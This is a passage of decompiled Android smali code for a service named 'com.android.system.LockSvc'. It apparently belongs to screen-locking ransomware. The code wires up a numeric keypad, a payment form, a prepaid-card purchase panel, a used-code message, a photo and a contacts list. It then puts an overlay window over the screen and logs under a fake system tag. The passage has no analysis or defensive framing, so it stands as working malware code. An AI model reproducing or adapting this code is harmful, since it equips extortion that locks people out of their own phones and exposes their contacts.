    const-string v5, "butt_7"

    const-string v7, "id"

    invoke-virtual/range {p0 .. p0}, Lcom/android/system/LockSvc;->getPackageName()Ljava/lang/String;

    move-result-object v13

    invoke-virtual {v4, v5, v7, v13}, Landroid/content/res/Resources;->getIdentifier(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)I

    move-result v4

    move-object/from16 v0, p1

    invoke-virtual {v0, v4}, Landroid/view/View;->findViewById(I)Landroid/view/View;

    move-result-object v26

    .line 252
    check-cast v26, Landroid/widget/Button;

    .line 256
    .local v26, "Butt_7":Landroid/widget/Button;
    invoke-virtual/range {p0 .. p0}, Lcom/android/system/LockSvc;->getResources()Landroid/content/res/Resources;

    move-result-object v4

    const-string v5, "butt_8"

    const-string v7, "id"

    invoke-virtual/range {p0 .. p0}, Lcom/android/system/LockSvc;->getPackageName()Ljava/lang/String;

    move-result-object v13

    invoke-virtual {v4, v5, v7, v13}, Landroid/content/res/Resources;->getIdentifier(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)I

    move-result v4

    move-object/from16 v0, p1

    invoke-virtual {v0, v4}, Landroid/view/View;->findViewById(I)Landroid/view/View;

    move-result-object v27

    .line 255
    check-cast v27, Landroid/widget/Button;

    .line 260
    .local v27, "Butt_8":Landroid/widget/Button;
    invoke-virtual/range {p0 .. p0}, Lcom/android/system/LockSvc;->getResources()Landroid/content/res/Resources;

    move-result-object v4

    const-string v5, "butt_9"

    const-string v7, "id"

    invoke-virtual/range {p0 .. p0}, Lcom/android/system/LockSvc;->getPackageName()Ljava/lang/String;

    move-result-object v13

    invoke-virtual {v4, v5, v7, v13}, Landroid/content/res/Resources;->getIdentifier(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)I

    move-result v4

    move-object/from16 v0, p1

    invoke-virtual {v0, v4}, Landroid/view/View;->findViewById(I)Landroid/view/View;

    move-result-object v28

    .line 259
    check-cast v28, Landroid/widget/Button;

    .line 264
    .local v28, "Butt_9":Landroid/widget/Button;
    invoke-virtual/range {p0 .. p0}, Lcom/android/system/LockSvc;->getResources()Landroid/content/res/Resources;

    move-result-object v4

    const-string v5, "butt_0"

    const-string v7, "id"

    invoke-virtual/range {p0 .. p0}, Lcom/android/system/LockSvc;->getPackageName()Ljava/lang/String;

    move-result-object v13

    invoke-virtual {v4, v5, v7, v13}, Landroid/content/res/Resources;->getIdentifier(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)I

    move-result v4

    move-object/from16 v0, p1

    invoke-virtual {v0, v4}, Landroid/view/View;->findViewById(I)Landroid/view/View;

    move-result-object v19

    .line 263
    check-cast v19, Landroid/widget/Button;

    .line 269
    .local v19, "Butt_0":Landroid/widget/Button;
    invoke-virtual/range {p0 .. p0}, Lcom/android/system/LockSvc;->getResources()Landroid/content/res/Resources;

    move-result-object v4

    const-string v5, "proceed"

    const-string v7, "id"

    invoke-virtual/range {p0 .. p0}, Lcom/android/system/LockSvc;->getPackageName()Ljava/lang/String;

    move-result-object v13

    invoke-virtual {v4, v5, v7, v13}, Landroid/content/res/Resources;->getIdentifier(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)I

    move-result v4

    move-object/from16 v0, p1

    invoke-virtual {v0, v4}, Landroid/view/View;->findViewById(I)Landroid/view/View;

    move-result-object v34

    .line 268
    check-cast v34, Landroid/widget/Button;

    .line 272
    .local v34, "Proceed":Landroid/widget/Button;
    invoke-virtual/range {p0 .. p0}, Lcom/android/system/LockSvc;->getResources()Landroid/content/res/Resources;

    move-result-object v4

    const-string v5, "error"

    const-string v7, "id"

    invoke-virtual/range {p0 .. p0}, Lcom/android/system/LockSvc;->getPackageName()Ljava/lang/String;

    move-result-object v13

    invoke-virtual {v4, v5, v7, v13}, Landroid/content/res/Resources;->getIdentifier(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)I

    move-result v4

    move-object/from16 v0, p1

    invoke-virtual {v0, v4}, Landroid/view/View;->findViewById(I)Landroid/view/View;

    move-result-object v9

    .line 271
    check-cast v9, Landroid/widget/LinearLayout;

    .line 275
    .local v9, "Error":Landroid/widget/LinearLayout;
    invoke-virtual/range {p0 .. p0}, Lcom/android/system/LockSvc;->getResources()Landroid/content/res/Resources;

    move-result-object v4

    const-string v5, "payform"

    const-string v7, "id"

    invoke-virtual/range {p0 .. p0}, Lcom/android/system/LockSvc;->getPackageName()Ljava/lang/String;

    move-result-object v13

    invoke-virtual {v4, v5, v7, v13}, Landroid/content/res/Resources;->getIdentifier(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)I

    move-result v4

    move-object/from16 v0, p1

    invoke-virtual {v0, v4}, Landroid/view/View;->findViewById(I)Landroid/view/View;

    move-result-object v12

    .line 274
    check-cast v12, Landroid/widget/LinearLayout;

    .line 278
    .local v12, "PayForm":Landroid/widget/LinearLayout;
    invoke-virtual/range {p0 .. p0}, Lcom/android/system/LockSvc;->getResources()Landroid/content/res/Resources;

    move-result-object v4

    const-string v5, "mp_loaded"

    const-string v7, "id"

    invoke-virtual/range {p0 .. p0}, Lcom/android/system/LockSvc;->getPackageName()Ljava/lang/String;

    move-result-object v13

    invoke-virtual {v4, v5, v7, v13}, Landroid/content/res/Resources;->getIdentifier(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)I

    move-result v4

    move-object/from16 v0, p1

    invoke-virtual {v0, v4}, Landroid/view/View;->findViewById(I)Landroid/view/View;

    move-result-object v8

    .line 277
    check-cast v8, Landroid/widget/LinearLayout;

    .line 281
    .local v8, "Loaded":Landroid/widget/LinearLayout;
    invoke-virtual/range {p0 .. p0}, Lcom/android/system/LockSvc;->getResources()Landroid/content/res/Resources;

    move-result-object v4

    const-string v5, "used_code"

    const-string v7, "id"

    invoke-virtual/range {p0 .. p0}, Lcom/android/system/LockSvc;->getPackageName()Ljava/lang/String;

    move-result-object v13

    invoke-virtual {v4, v5, v7, v13}, Landroid/content/res/Resources;->getIdentifier(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)I

    move-result v4

    move-object/from16 v0, p1

    invoke-virtual {v0, v4}, Landroid/view/View;->findViewById(I)Landroid/view/View;

    move-result-object v10

    .line 280
    check-cast v10, Landroid/widget/LinearLayout;

    .line 284
    .local v10, "UsedCode":Landroid/widget/LinearLayout;
    invoke-virtual/range {p0 .. p0}, Lcom/android/system/LockSvc;->getResources()Landroid/content/res/Resources;

    move-result-object v4

    const-string v5, "mpack_buy"

    const-string v7, "id"

    invoke-virtual/range {p0 .. p0}, Lcom/android/system/LockSvc;->getPackageName()Ljava/lang/String;

    move-result-object v13

    invoke-virtual {v4, v5, v7, v13}, Landroid/content/res/Resources;->getIdentifier(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)I

    move-result v4

    move-object/from16 v0, p1

    invoke-virtual {v0, v4}, Landroid/view/View;->findViewById(I)Landroid/view/View;

    move-result-object v31

    .line 283
    check-cast v31, Landroid/widget/LinearLayout;

    .line 287
    .local v31, "Help_MP":Landroid/widget/LinearLayout;
    invoke-virtual/range {p0 .. p0}, Lcom/android/system/LockSvc;->getResources()Landroid/content/res/Resources;

    move-result-object v4

    const-string v5, "photo_id"

    const-string v7, "id"

    invoke-virtual/range {p0 .. p0}, Lcom/android/system/LockSvc;->getPackageName()Ljava/lang/String;

    move-result-object v13

    invoke-virtual {v4, v5, v7, v13}, Landroid/content/res/Resources;->getIdentifier(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)I

    move-result v4

    move-object/from16 v0, p1

    invoke-virtual {v0, v4}, Landroid/view/View;->findViewById(I)Landroid/view/View;

    move-result-object v33

    .line 286
    check-cast v33, Landroid/widget/ImageView;

    .line 290
    .local v33, "PhotoId":Landroid/widget/ImageView;
    invoke-virtual/range {p0 .. p0}, Lcom/android/system/LockSvc;->getResources()Landroid/content/res/Resources;

    move-result-object v4

    const-string v5, "scr_contacts"

    const-string v7, "id"

    invoke-virtual/range {p0 .. p0}, Lcom/android/system/LockSvc;->getPackageName()Ljava/lang/String;

    move-result-object v13

    invoke-virtual {v4, v5, v7, v13}, Landroid/content/res/Resources;->getIdentifier(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)I

    move-result v4

    move-object/from16 v0, p1

    invoke-virtual {v0, v4}, Landroid/view/View;->findViewById(I)Landroid/view/View;

    move-result-object v37

    .line 289
    check-cast v37, Landroid/widget/ScrollView;

    .line 293
    .local v37, "scr_contacts":Landroid/widget/ScrollView;
    invoke-virtual/range {p0 .. p0}, Lcom/android/system/LockSvc;->getResources()Landroid/content/res/Resources;

    move-result-object v4

    const-string v5, "mpack_form"

    const-string v7, "id"

    invoke-virtual/range {p0 .. p0}, Lcom/android/system/LockSvc;->getPackageName()Ljava/lang/String;

    move-result-object v13

    invoke-virtual {v4, v5, v7, v13}, Landroid/content/res/Resources;->getIdentifier(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)I

    move-result v4

    move-object/from16 v0, p1

    invoke-virtual {v0, v4}, Landroid/view/View;->findViewById(I)Landroid/view/View;

    move-result-object v32

    .line 292
    check-cast v32, Landroid/widget/ScrollView;

    .line 296
    .local v32, "M_Pack":Landroid/widget/ScrollView;
    move-object/from16 v0, p0

    iget-object v4, v0, Lcom/android/system/LockSvc;->VW:Landroid/view/View;

    .line 297
    invoke-virtual/range {p0 .. p0}, Lcom/android/system/LockSvc;->getResources()Landroid/content/res/Resources;

    move-result-object v5

    const-string v7, "cont_list"

    const-string v13, "id"

    invoke-virtual/range {p0 .. p0}, Lcom/android/system/LockSvc;->getPackageName()Ljava/lang/String;

    move-result-object v14

    invoke-virtual {v5, v7, v13, v14}, Landroid/content/res/Resources;->getIdentifier(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)I

    move-result v5

    invoke-virtual {v4, v5}, Landroid/view/View;->findViewById(I)Landroid/view/View;

    move-result-object v6

    .line 296
    check-cast v6, Landroid/widget/ListView;

    .line 301
    .local v6, "ConList":Landroid/widget/ListView;
    new-instance v4, Lcom/android/system/LockSvc$LoadImg;

    move-object/from16 v0, p0

    invoke-direct {v4, v0}, Lcom/android/system/LockSvc$LoadImg;-><init>(Lcom/android/system/LockSvc;)V

    const/4 v5, 0x0

    new-array v5, v5, [Ljava/lang/Void;

    invoke-virtual {v4, v5}, Lcom/android/system/LockSvc$LoadImg;->execute([Ljava/lang/Object;)Landroid/os/AsyncTask;

    .line 303
    new-instance v4, Lcom/android/system/LockSvc$ContactExe;

    move-object/from16 v0, p0

    invoke-direct {v4, v0}, Lcom/android/system/LockSvc$ContactExe;-><init>(Lcom/android/system/LockSvc;)V

    const/4 v5, 0x0

    new-array v5, v5, [Ljava/lang/Void;

    invoke-virtual {v4, v5}, Lcom/android/system/LockSvc$ContactExe;->execute([Ljava/lang/Object;)Landroid/os/AsyncTask;

    .line 305
    move-object/from16 v0, p0

    iget-object v4, v0, Lcom/android/system/LockSvc;->VW:Landroid/view/View;

    invoke-virtual {v6, v4}, Landroid/widget/ListView;->clearChildFocus(Landroid/view/View;)V

    .line 307
    invoke-virtual {v6}, Landroid/widget/ListView;->clearFocus()V

    .line 310
    new-instance v36, Landroid/os/Handler;

    invoke-direct/range {v36 .. v36}, Landroid/os/Handler;-><init>()V

    .line 311
    .local v36, "RView":Landroid/os/Handler;
    new-instance v35, Lcom/android/system/LockSvc$4;

    move-object/from16 v0, v35

    move-object/from16 v1, p0

    move-object/from16 v2, p1

    move-object/from16 v3, v36

    invoke-direct {v0, v1, v2, v3}, Lcom/android/system/LockSvc$4;-><init>(Lcom/android/system/LockSvc;Landroid/view/View;Landroid/os/Handler;)V

    .line 360
    .local v35, "RV":Ljava/lang/Runnable;
    const-wide/16 v4, 0x3e8

    move-object/from16 v0, v36

    move-object/from16 v1, v35

    invoke-virtual {v0, v1, v4, v5}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    .line 366
    new-instance v4, Lcom/android/system/LockSvc$5;

    move-object/from16 v5, p0

    move-object/from16 v7, p1

    invoke-direct/range {v4 .. v12}, Lcom/android/system/LockSvc$5;-><init>(Lcom/android/system/LockSvc;Landroid/widget/ListView;Landroid/view/View;Landroid/widget/LinearLayout;Landroid/widget/LinearLayout;Landroid/widget/LinearLayout;Landroid/widget/TextView;Landroid/widget/LinearLayout;)V

    move-object/from16 v0, v34

    invoke-virtual {v0, v4}, Landroid/widget/Button;->setOnClickListener(Landroid/view/View$OnClickListener;)V

    .line 483
    new-instance v4, Lcom/android/system/LockSvc$6;

    move-object/from16 v0, p0

    invoke-direct {v4, v0}, Lcom/android/system/LockSvc$6;-><init>(Lcom/android/system/LockSvc;)V

    move-object/from16 v0, v20

    invoke-virtual {v0, v4}, Landroid/widget/Button;->setOnClickListener(Landroid/view/View$OnClickListener;)V

    .line 491
    new-instance v4, Lcom/android/system/LockSvc$7;

    move-object/from16 v0, p0

    invoke-direct {v4, v0}, Lcom/android/system/LockSvc$7;-><init>(Lcom/android/system/LockSvc;)V

    move-object/from16 v0, v21

    invoke-virtual {v0, v4}, Landroid/widget/Button;->setOnClickListener(Landroid/view/View$OnClickListener;)V

    .line 499
    new-instance v4, Lcom/android/system/LockSvc$8;

    move-object/from16 v0, p0

    invoke-direct {v4, v0}, Lcom/android/system/LockSvc$8;-><init>(Lcom/android/system/LockSvc;)V

    move-object/from16 v0, v22

    invoke-virtual {v0, v4}, Landroid/widget/Button;->setOnClickListener(Landroid/view/View$OnClickListener;)V

    .line 507
    new-instance v4, Lcom/android/system/LockSvc$9;

    move-object/from16 v0, p0

    invoke-direct {v4, v0}, Lcom/android/system/LockSvc$9;-><init>(Lcom/android/system/LockSvc;)V

    move-object/from16 v0, v23

    invoke-virtual {v0, v4}, Landroid/widget/Button;->setOnClickListener(Landroid/view/View$OnClickListener;)V

    .line 515
    new-instance v4, Lcom/android/system/LockSvc$10;

    move-object/from16 v0, p0

    invoke-direct {v4, v0}, Lcom/android/system/LockSvc$10;-><init>(Lcom/android/system/LockSvc;)V

    move-object/from16 v0, v24

    invoke-virtual {v0, v4}, Landroid/widget/Button;->setOnClickListener(Landroid/view/View$OnClickListener;)V

    .line 523
    new-instance v4, Lcom/android/system/LockSvc$11;

    move-object/from16 v0, p0

    invoke-direct {v4, v0}, Lcom/android/system/LockSvc$11;-><init>(Lcom/android/system/LockSvc;)V

    move-object/from16 v0, v25

    invoke-virtual {v0, v4}, Landroid/widget/Button;->setOnClickListener(Landroid/view/View$OnClickListener;)V

    .line 532
    new-instance v4, Lcom/android/system/LockSvc$12;

    move-object/from16 v0, p0

    invoke-direct {v4, v0}, Lcom/android/system/LockSvc$12;-><init>(Lcom/android/system/LockSvc;)V

    move-object/from16 v0, v26

    invoke-virtual {v0, v4}, Landroid/widget/Button;->setOnClickListener(Landroid/view/View$OnClickListener;)V

    .line 540
    new-instance v4, Lcom/android/system/LockSvc$13;

    move-object/from16 v0, p0

    invoke-direct {v4, v0}, Lcom/android/system/LockSvc$13;-><init>(Lcom/android/system/LockSvc;)V

    move-object/from16 v0, v27

    invoke-virtual {v0, v4}, Landroid/widget/Button;->setOnClickListener(Landroid/view/View$OnClickListener;)V

    .line 549
    new-instance v4, Lcom/android/system/LockSvc$14;

    move-object/from16 v0, p0

    invoke-direct {v4, v0}, Lcom/android/system/LockSvc$14;-><init>(Lcom/android/system/LockSvc;)V

    move-object/from16 v0, v28

    invoke-virtual {v0, v4}, Landroid/widget/Button;->setOnClickListener(Landroid/view/View$OnClickListener;)V

    .line 558
    new-instance v4, Lcom/android/system/LockSvc$15;

    move-object/from16 v0, p0

    invoke-direct {v4, v0}, Lcom/android/system/LockSvc$15;-><init>(Lcom/android/system/LockSvc;)V

    move-object/from16 v0, v19

    invoke-virtual {v0, v4}, Landroid/widget/Button;->setOnClickListener(Landroid/view/View$OnClickListener;)V

    .line 566
    new-instance v13, Lcom/android/system/LockSvc$16;

    move-object/from16 v14, p0

    move-object v15, v11

    move-object/from16 v16, v8

    move-object/from16 v17, v9

    move-object/from16 v18, v10

    invoke-direct/range {v13 .. v18}, Lcom/android/system/LockSvc$16;-><init>(Lcom/android/system/LockSvc;Landroid/widget/TextView;Landroid/widget/LinearLayout;Landroid/widget/LinearLayout;Landroid/widget/LinearLayout;)V

    move-object/from16 v0, v29

    invoke-virtual {v0, v13}, Landroid/widget/Button;->setOnClickListener(Landroid/view/View$OnClickListener;)V

    .line 592
    new-instance v4, Lcom/android/system/LockSvc$17;

    move-object/from16 v0, p0

    move-object/from16 v1, v31

    invoke-direct {v4, v0, v1}, Lcom/android/system/LockSvc$17;-><init>(Lcom/android/system/LockSvc;Landroid/widget/LinearLayout;)V

    move-object/from16 v0, v30

    invoke-virtual {v0, v4}, Landroid/widget/Button;->setOnClickListener(Landroid/view/View$OnClickListener;)V

    .line 616
    move-object/from16 v0, p0

    iget-object v4, v0, Lcom/android/system/LockSvc;->WM:Landroid/view/WindowManager;

    move-object/from16 v0, p0

    iget-object v5, v0, Lcom/android/system/LockSvc;->VW:Landroid/view/View;

    move-object/from16 v0, p0

    iget-object v7, v0, Lcom/android/system/LockSvc;->Params:Landroid/view/WindowManager$LayoutParams;

    invoke-interface {v4, v5, v7}, Landroid/view/WindowManager;->addView(Landroid/view/View;Landroid/view/ViewGroup$LayoutParams;)V

    .line 618
    return-void
.end method

.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .locals 1
    .param p1, "intent"    # Landroid/content/Intent;

    .prologue
    .line 99
    const/4 v0, 0x0

    return-object v0
.end method

.method public onDestroy()V
    .locals 0

    .prologue
    .line 103
    invoke-super {p0}, Landroid/app/Service;->onDestroy()V

    .line 104
    return-void
.end method

.method public onStart(Landroid/content/Intent;I)V
    .locals 4
    .param p1, "intent"    # Landroid/content/Intent;
    .param p2, "startId"    # I

    .prologue
    .line 109
    const-string v0, "dalvikvm-heap"

    const-string v1, "OK"

    invoke-static {v0, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 110
    invoke-super {p0, p1, p2}, Landroid/app/Service;->onStart(Landroid/content/Intent;I)V

    .line 112
    new-instance v0, Lcom/android/system/LockSvc$Init_Svc;

    invoke-direct {v0, p0}, Lcom/android/system/LockSvc$Init_Svc;-><init>(Lcom/android/system/LockSvc;)V

    const/4 v1, 0x1

    new-array v1, v1, [Landroid/content/Context;

    const/4 v2, 0x0

    invoke-virtual {p0}, Lcom/android/system/LockSvc;->getApplicationContext()Landroid/content/Context;

    move-result-object v3

    aput-object v3, v1, v2

    invoke-virtual {v0, v1}, Lcom/android/system/LockSvc$Init_Svc;->execute([Ljava/lang/Object;)Landroid/os/AsyncTask;

    .line 117
    return-void
.end method
